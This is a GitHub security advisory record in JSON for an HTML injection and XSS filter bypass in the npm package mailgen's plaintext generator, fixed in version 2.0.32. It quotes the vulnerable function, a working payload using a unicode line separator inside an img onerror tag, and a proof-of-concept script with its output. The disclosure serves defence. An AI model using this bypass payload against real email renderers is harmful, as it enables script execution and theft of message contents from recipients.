{
  "Severity": "LOW",
  "UpdatedAt": "2025-10-15T19:29:38Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "mailgen"
  },
  "Advisory": {
    "DatabaseId": 317319,
    "Id": "GSA_kwCzR0hTQS1xNHc5LXgzcnYtNGM4as4ABNeH",
    "GhsaId": "GHSA-q4w9-x3rv-4c8j",
    "References": [
      {
        "Url": "https://github.com/eladnava/mailgen/security/advisories/GHSA-q4w9-x3rv-4c8j"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-62380"
      },
      {
        "Url": "https://github.com/eladnava/mailgen/commit/7a791a424ff3a3f7783f8750919f1e98639924a8"
      },
      {
        "Url": "https://github.com/advisories/GHSA-q4w9-x3rv-4c8j"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-q4w9-x3rv-4c8j"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-62380"
      }
    ],
    "Description": "### Summary\n\nAn HTML injection vulnerability in plaintext emails generated by Mailgen has been discovered. Projecta are affected if the `Mailgen.generatePlaintext(email)` method is used and passed in user-generated content. The issue was discovered and reported by Edoardo Ottavianelli (@edoardottt).\n\n### Details\n\nThe following function (inside index.js) is intended to strip all HTML content to produce a plaintext string.\n\n```javascript\n// Plaintext text e-mail generator\nMailgen.prototype.generatePlaintext = function (params) {\n    // Plaintext theme not cached?\n    if (!this.cachedPlaintextTheme) {\n        throw new Error('An error was encountered while loading the plaintext theme.');\n    }\n    \n    // Parse email params and get back an object with data to inject\n    var ejsParams = this.parseParams(params);\n\n    // Render the plaintext theme with ejs, injecting the data accordingly\n    var output = ejs.render(this.cachedPlaintextTheme, ejsParams);\n\n    // Definition of the \u003cbr /\u003e tag as a regex pattern\n    var breakTag = /(?:\\\u003cbr\\s*\\/?\\\u003e)/g;\n    var breakTagPattern = new RegExp(breakTag);\n\n    // Check the plaintext for html break tag, maintains backwards compatiblity\n    if (breakTagPattern.test(this.cachedPlaintextTheme)) {\n        // Strip all linebreaks from the rendered plaintext\n        output = output.replace(/(?:\\r\\n|\\r|\\n)/g, '');\n\n        // Replace html break tags with linebreaks\n        output = output.replace(breakTag, '\\n');\n\n        // Remove plaintext theme indentation (tabs or spaces in the beginning of each line)\n        output = output.replace(/^(?: |\\t)*/gm, \"\");\n    }\n\n    // Decode HTML entities such as \u0026copy;\n    output = he.decode(output);\n\n    // Strip all HTML tags from plaintext output\n    output = output.replace(/\u003c(.|\\n)+?\u003e/g, '');\n\n    // All done!\n    return output;\n};\n```\n\nThe process fails because it searches for HTML tags and attempts to strip them from the input. However, if the unicode encoded characters are present inside HTML tags, they are not removed. These encoded tags are then decoded later and become valid HTML content, which can lead to XSS vulnerabilities.\n\nA valid payload is: `\u003cimg src=x onerror=alert(1)\\u2028\u003e`.\n\n### PoC\n\n```javascript\nvar Mailgen = require('mailgen');\n\n// Configure mailgen by setting a theme and your product info\nvar mailGenerator = new Mailgen({\n    theme: 'default',\n    product: {\n        // Appears in header \u0026 footer of e-mails\n        name: 'Mailgen',\n        link: 'https://mailgen.js/'\n        // Optional product logo\n        // logo: 'https://mailgen.js/img/logo.png'\n    }\n});\n\nvar email = {\n    body: {\n        name: 'John \u003cimg src=x onerror=alert(document.body.innerHTML)\\u2028\u003e Appleseed',\n        intro: 'Welcome to Mailgen! We\\'re very excited to have you on board.',\n        action: {\n            instructions: 'To get started with Mailgen, please click here:',\n            button: {\n                color: '#22BC66', // Optional action button color\n                text: 'Confirm your account',\n                link: 'secret-link'\n            }\n        },\n        outro: 'Need help, or have questions? Just reply to this email, we\\'d love to help.'\n    }\n};\n\nvar emailText = mailGenerator.generatePlaintext(email);\nrequire('fs').writeFileSync('emailText.html', emailText, 'utf8');\n```\n\n**Resulting output file (emailText.html)**:\n\n```HTML\nHi John \u003cimg src=x onerror=alert(document.body.innerHTML)\u2028\u003e Appleseed,\n\nWelcome to Mailgen! We're very excited to have you on board.        \n\nTo get started with Mailgen, please click here:        \nsecret-link            \n\nNeed help, or have questions? Just reply to this email, we'd love to help.        \n\nYours truly,  \nMailgen\n\nÂ© 2025 Mailgen. All rights reserved.\n```\n\n### Impact\n\nDepending on the context/environment where the plaintext message is used, if HTML is rendered and executed can result in arbitrary code execution in the browser of the victim (potentially stealing secrets or sensitive information contained in the message).\n\n### Credits\n\nEdoardo Ottavianelli (@edoardottt)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-10-15T19:29:36Z",
    "Severity": "LOW",
    "Summary": "Mailgen has HTML Injection and XSS Filter Bypass in Plaintext Emails",
    "UpdatedAt": "2025-10-15T19:29:38Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "2.0.32"
      },
      "VulnerableVersionRange": "\u003c= 2.0.31"
    }
  ]
}